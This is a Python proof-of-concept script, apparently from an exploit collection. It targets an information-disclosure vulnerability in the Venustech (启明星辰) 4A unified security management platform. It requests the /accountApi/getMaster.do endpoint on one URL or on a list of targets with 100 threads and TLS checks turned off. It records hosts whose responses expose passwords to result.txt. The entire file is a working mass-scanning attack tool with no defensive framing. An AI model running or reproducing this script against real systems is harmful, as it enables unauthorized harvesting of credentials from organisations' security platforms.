# 启明星辰-4A统一安全管控平台_getMater_信息泄露
import requests, argparse, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)

def poc(target):
    api = "/accountApi/getMaster.do"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.881.36 Safari/537.36'
    }

    try:
        res = requests.get(url=target + api, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'password' in res.text:
            print(f"[+]{target}存在信息泄露")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target}存在信息泄露\n")
        else:
            print(f"[-]{target}不存在信息泄露")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parse = argparse.ArgumentParser(description="启明星辰-4A统一安全管控平台_getMater_信息泄露漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()